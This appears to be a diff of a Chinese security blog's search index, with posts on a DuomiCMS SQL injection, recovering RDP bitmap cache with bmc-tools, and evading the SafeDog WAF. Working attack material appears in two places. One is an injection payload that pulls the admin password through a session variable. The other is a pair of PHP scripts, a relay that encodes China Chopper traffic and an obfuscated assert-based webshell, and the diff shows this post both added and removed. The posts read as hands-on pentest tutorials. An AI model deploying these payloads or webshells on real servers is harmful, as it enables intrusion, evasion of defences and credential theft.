+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($dm==<span class="string">&#x27;mybuy&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$page = $_GET[<span class="string">&quot;page&quot;</span>];</span><br><span class="line">$pcount = <span class="number">20</span>;</span><br><span class="line">$row=$dsql-&gt;getOne(<span class="string">&quot;select count(id) as dd from duomi_buy where uid=&quot;</span>.$uid);</span><br><span class="line">$rcount=$row[<span class="string">&#x27;dd&#x27;</span>];	</span><br><span class="line">$page_count = ceil($rcount/$pcount); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">&#x27;page&#x27;</span>])||$_GET[<span class="string">&#x27;page&#x27;</span>]&lt;<span class="number">0</span>)&#123; </span><br><span class="line">$page=<span class="number">1</span>; </span><br><span class="line">&#125;<span class="keyword">else</span> &#123; </span><br><span class="line">$page=$_GET[<span class="string">&#x27;page&#x27;</span>]; </span><br><span class="line">&#125;</span><br><span class="line">$select_limit = $pcount; </span><br><span class="line">$select_from = ($page - <span class="number">1</span>) * $pcount.<span class="string">&#x27;,&#x27;</span>; </span><br><span class="line">$pre_page = ($page == <span class="number">1</span>)? <span class="number">1</span> : $page - <span class="number">1</span>; </span><br><span class="line">$next_page= ($page == $page_count)? $page_count : $page + <span class="number">1</span> ; </span><br><span class="line">$dsql-&gt;setQuery(<span class="string">&quot;select * from duomi_buy where uid=&quot;</span>.$uid.<span class="string">&quot; limit &quot;</span>.($page<span class="number">-1</span>)*$pcount.<span class="string">&quot;,<span class="subst">$pcount</span>&quot;</span>);</span><br><span class="line">$dsql-&gt;Execute(<span class="string">&#x27;buylist&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p> $uid，session取值，无过滤带入查询，post提交即可覆盖该变量</p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//127.0.0.1/duomicms_1.30/member/exchange.php</span></span><br><span class="line">_SESSION[duomi_user_id]=@`<span class="string">&#x27;` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`&#x27;</span>`</span><br></pre></td></tr></table></figure>
+ <img src="/2016/11/01/duomiCMS/duomiCMS_03.png" class="">
+
+
+
+
+
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -709,6 +767,35 @@
       </tags>
   </entry>
   <entry>
+    <title>信息收集 - 远程桌面重现</title>
+    <url>/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E9%87%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>常规的信息收集技术就不多讲了，前两天apt32砖家东给我发来一篇文章</p>
+<blockquote>
+<p><a href="https://www.freebuf.com/articles/web/279561.html">https://www.freebuf.com/articles/web/279561.html</a></p>
+</blockquote>
+<p>我一看，牛蛙，rdp远程桌面重现，没想到信息收集还能有这种姿势，属实稀奇，于是试玩了一波</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文章写的很详细，我就不赘述了，大致原理就是远程桌面会有缓存，解析缓存重现rdp</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>打开缓存目录<code>C:\Users\Administrator\AppData\Local\Microsoft\Terminal Server Client\Cache</code>，看到确实有文件</p>
+<a id="more"></a>
+<p><img src="bmc.png" alt="bmc"></p>
+<p>有大佬写好了工具，直接用工具解析该文件，想知道原理的可以去看原文章</p>
+<blockquote>
+<p><a href="https://github.com/ANSSI-FR/bmc-tools">https://github.com/ANSSI-FR/bmc-tools</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bmc-tools.py -s &quot;C:\Users\Administrator\AppData\Local\Microsoft\Terminal Server Client\Cache&quot; -d d:\intranet\bmc-tools</span><br></pre></td></tr></table></figure>
+
+<p><img src="bmc-tools.png" alt="bmc-tools"><br>提取完成，20m文件提取出2553个文件，还是蛮多的，打开看下</p>
+<p><img src="bmc-tools_2.png" alt="bmc-tools_2"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>很新奇的一种信息收集方式，虽然用处不是那么大，但在实在无法收集到信息的时候还是可以尝试一下，属于走投无路的一种奇技淫巧，特此记录</p>
+]]></content>
+      <tags>
+        <tag>奇技淫巧</tag>
+        <tag>信息收集</tag>
+        <tag>3389</tag>
+        <tag>远程桌面</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>双系统安装 - win7下安装kali2.0</title>
     <url>/2018/04/19/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85-win7%E4%B8%8B%E5%AE%89%E8%A3%85kali2-0/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>旧笔记本淘汰了，卖掉可惜，扔了更可惜，平时经常有破解wifi的需要，干脆把它做成双系统，win+linux两不误，由于我的华硕是UEFI+GPT，导致我双系统怎么都装不成功，由此开启了我崎岖的踩坑路。</p>
@@ -756,32 +843,39 @@
       </tags>
   </entry>
   <entry>
-    <title>信息收集 - 远程桌面重现</title>
-    <url>/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E9%87%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>常规的信息收集技术就不多讲了，前两天apt32砖家东给我发来一篇文章</p>
-<blockquote>
-<p><a href="https://www.freebuf.com/articles/web/279561.html">https://www.freebuf.com/articles/web/279561.html</a></p>
-</blockquote>
-<p>我一看，牛蛙，rdp远程桌面重现，没想到信息收集还能有这种姿势，属实稀奇，于是试玩了一波</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文章写的很详细，我就不赘述了，大致原理就是远程桌面会有缓存，解析缓存重现rdp</p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>打开缓存目录<code>C:\Users\Administrator\AppData\Local\Microsoft\Terminal Server Client\Cache</code>，看到确实有文件</p>
+    <title>安全狗绕过 - 本地中转bypass</title>
+    <url>/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>若服务器安装了安全狗，普通一句话安全狗肯定拦截，菜刀必然无法使用。</p>
+<p>究其原因：菜刀请求关键字等被安全狗识别导致中断请求。</p>
+<p>构造本地中转脚本，本地服务器发送请求，对菜刀请求关键字进行编码，服务端再对请求解码，这样安全狗无法识别也就无法拦截请求。</p>
+<h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><p>客户端即中转脚本<code>transfer.php</code></p>
+<p>客户端对菜刀请求参数进行编码操作，此处仅做简单编码验证bypass，编码顺序依次为</p>
 <a id="more"></a>
-<p><img src="bmc.png" alt="bmc"></p>
-<p>有大佬写好了工具，直接用工具解析该文件，想知道原理的可以去看原文章</p>
 <blockquote>
-<p><a href="https://github.com/ANSSI-FR/bmc-tools">https://github.com/ANSSI-FR/bmc-tools</a></p>
+<p><code>base64_encode()</code>,<br><code>str_rot13()</code>,<br><code>strrev()</code>,<br><code>base64_encode()</code></p>
 </blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bmc-tools.py -s &quot;C:\Users\Administrator\AppData\Local\Microsoft\Terminal Server Client\Cache&quot; -d d:\intranet\bmc-tools</span><br></pre></td></tr></table></figure>
+<p>经过这4层编码，对服务端发送请求。</p>
+<figure class="highlight php"><figcaption><span>客户端：transfer.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	$DS = base64_encode($str);</span><br><span class="line">	$DS = str_rot13($DS);</span><br><span class="line">	$DS = strrev($DS);</span><br><span class="line">	$DS = base64_encode($DS);</span><br><span class="line">	<span class="keyword">return</span> $DS;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// webshell地址，transServ.php为定制一句话</span></span><br><span class="line">	$webshell = <span class="string">&#x27;http://127.0.0.1/transServ.php&#x27;</span>;</span><br><span class="line">	$pdata = $_POST;</span><br><span class="line">	<span class="keyword">foreach</span>($pdata <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">		<span class="keyword">if</span>(is_array($value))&#123;</span><br><span class="line">			$value=implode($value);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 菜刀密码</span></span><br><span class="line">		<span class="keyword">if</span>($key == <span class="string">&#x27;pass&#x27;</span>) &#123;</span><br><span class="line">			$pdata[$key] = encode($value);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// var_dump($pdata);</span></span><br><span class="line">	$data = http_build_query($pdata);</span><br><span class="line">	</span><br><span class="line">	$opts = <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">&#x27;http&#x27;</span> =&gt; <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;header&#x27;</span>=&gt; <span class="string">&quot;Content-type: application/x-www-form-urlencoded\r\n&quot;</span> . <span class="string">&quot;Content-Length: &quot;</span> . strlen($data) . <span class="string">&quot;\r\n&quot;</span>,</span><br><span class="line">		<span class="string">&#x27;content&#x27;</span> =&gt; $data)</span><br><span class="line">	);</span><br><span class="line">	$context = stream_context_create($opts);</span><br><span class="line">	<span class="comment">// 创建资源流上下文,数据包</span></span><br><span class="line">	$html = @file_get_contents($webshell, <span class="literal">false</span>, $context);</span><br><span class="line">	<span class="keyword">echo</span> $html;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="bmc-tools.png" alt="bmc-tools"><br>提取完成，20m文件提取出2553个文件，还是蛮多的，打开看下</p>
-<p><img src="bmc-tools_2.png" alt="bmc-tools_2"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>很新奇的一种信息收集方式，虽然用处不是那么大，但在实在无法收集到信息的时候还是可以尝试一下，属于走投无路的一种奇技淫巧，特此记录</p>
+<h1 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h1><p>服务端只需对请求进行解码操作，然后正常使用菜刀一句话即可，解码顺序依次为</p>
+<blockquote>
+<p><code>base64_decode()</code>,<br><code>str_rot13()</code>,<br><code>strrev()</code>,<br><code>base64_decode()</code></p>
+</blockquote>
+<p>此处使用<code>array_map()</code>回调后门，为保证新旧菜刀均可使用</p>
+<blockquote>
+<p>版本需求：<code>php&gt;5.2</code></p>
+</blockquote>
+<figure class="highlight php"><figcaption><span>服务端：transServ.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$DS = @$<span class="comment">/*-*/</span>&#123;<span class="string">&quot;_P&quot;</span>.<span class="string">&quot;OST&quot;</span>&#125;[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($DS) )&#123;</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$DS = @base64_decode($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$DS = @strrev($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$DS = @str_rot13($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$DS = @base64_decode($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	@array_map(assert,(<span class="keyword">array</span>)$DS);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><h2 id="浏览器验证"><a href="#浏览器验证" class="headerlink" title="浏览器验证"></a>浏览器验证</h2><p><img src="phpinfo.png" alt="phpinfo"></p>
+<h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>连接本地中转脚本，中转脚本对webshell发送编码后请求。</p>
+<p><img src="caidao.png" alt="caidao"></p>
+<h2 id="bypass安全狗"><a href="#bypass安全狗" class="headerlink" title="bypass安全狗"></a>bypass安全狗</h2><p><img src="bypass-safedog.png" alt="bypass-safedog"><br><img src="bypass-caidao.png" alt="bypass-caidao"></p>
 ]]></content>
       <tags>
-        <tag>奇技淫巧</tag>
-        <tag>信息收集</tag>
-        <tag>3389</tag>
-        <tag>远程桌面</tag>
+        <tag>安全狗</tag>
+        <tag>绕过</tag>
+        <tag>bypass</tag>
       </tags>
   </entry>
   <entry>
@@ -854,42 +948,6 @@
 ]]></content>
       <tags>
         <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>安全狗绕过 - 本地中转bypass</title>
-    <url>/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>若服务器安装了安全狗，普通一句话安全狗肯定拦截，菜刀必然无法使用。</p>
-<p>究其原因：菜刀请求关键字等被安全狗识别导致中断请求。</p>
-<p>构造本地中转脚本，本地服务器发送请求，对菜刀请求关键字进行编码，服务端再对请求解码，这样安全狗无法识别也就无法拦截请求。</p>
-<h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><p>客户端即中转脚本<code>transfer.php</code></p>
-<p>客户端对菜刀请求参数进行编码操作，此处仅做简单编码验证bypass，编码顺序依次为</p>
-<a id="more"></a>
-<blockquote>
-<p><code>base64_encode()</code>,<br><code>str_rot13()</code>,<br><code>strrev()</code>,<br><code>base64_encode()</code></p>
-</blockquote>
-<p>经过这4层编码，对服务端发送请求。</p>
-<figure class="highlight php"><figcaption><span>客户端：transfer.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	$DS = base64_encode($str);</span><br><span class="line">	$DS = str_rot13($DS);</span><br><span class="line">	$DS = strrev($DS);</span><br><span class="line">	$DS = base64_encode($DS);</span><br><span class="line">	<span class="keyword">return</span> $DS;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// webshell地址，transServ.php为定制一句话</span></span><br><span class="line">	$webshell = <span class="string">&#x27;http://127.0.0.1/transServ.php&#x27;</span>;</span><br><span class="line">	$pdata = $_POST;</span><br><span class="line">	<span class="keyword">foreach</span>($pdata <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">		<span class="keyword">if</span>(is_array($value))&#123;</span><br><span class="line">			$value=implode($value);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 菜刀密码</span></span><br><span class="line">		<span class="keyword">if</span>($key == <span class="string">&#x27;pass&#x27;</span>) &#123;</span><br><span class="line">			$pdata[$key] = encode($value);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// var_dump($pdata);</span></span><br><span class="line">	$data = http_build_query($pdata);</span><br><span class="line">	</span><br><span class="line">	$opts = <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">&#x27;http&#x27;</span> =&gt; <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;header&#x27;</span>=&gt; <span class="string">&quot;Content-type: application/x-www-form-urlencoded\r\n&quot;</span> . <span class="string">&quot;Content-Length: &quot;</span> . strlen($data) . <span class="string">&quot;\r\n&quot;</span>,</span><br><span class="line">		<span class="string">&#x27;content&#x27;</span> =&gt; $data)</span><br><span class="line">	);</span><br><span class="line">	$context = stream_context_create($opts);</span><br><span class="line">	<span class="comment">// 创建资源流上下文,数据包</span></span><br><span class="line">	$html = @file_get_contents($webshell, <span class="literal">false</span>, $context);</span><br><span class="line">	<span class="keyword">echo</span> $html;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h1><p>服务端只需对请求进行解码操作，然后正常使用菜刀一句话即可，解码顺序依次为</p>
-<blockquote>
-<p><code>base64_decode()</code>,<br><code>str_rot13()</code>,<br><code>strrev()</code>,<br><code>base64_decode()</code></p>
-</blockquote>
-<p>此处使用<code>array_map()</code>回调后门，为保证新旧菜刀均可使用</p>
-<blockquote>
-<p>版本需求：<code>php&gt;5.2</code></p>
-</blockquote>
-<figure class="highlight php"><figcaption><span>服务端：transServ.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$DS = @$<span class="comment">/*-*/</span>&#123;<span class="string">&quot;_P&quot;</span>.<span class="string">&quot;OST&quot;</span>&#125;[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($DS) )&#123;</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$DS = @base64_decode($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$DS = @strrev($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$DS = @str_rot13($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$DS = @base64_decode($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	@array_map(assert,(<span class="keyword">array</span>)$DS);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><h2 id="浏览器验证"><a href="#浏览器验证" class="headerlink" title="浏览器验证"></a>浏览器验证</h2><p><img src="phpinfo.png" alt="phpinfo"></p>
-<h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>连接本地中转脚本，中转脚本对webshell发送编码后请求。</p>
-<p><img src="caidao.png" alt="caidao"></p>
-<h2 id="bypass安全狗"><a href="#bypass安全狗" class="headerlink" title="bypass安全狗"></a>bypass安全狗</h2><p><img src="bypass-safedog.png" alt="bypass-safedog"><br><img src="bypass-caidao.png" alt="bypass-caidao"></p>
-]]></content>
-      <tags>
-        <tag>安全狗</tag>
-        <tag>绕过</tag>
-        <tag>bypass</tag>
       </tags>
   </entry>
 </search>
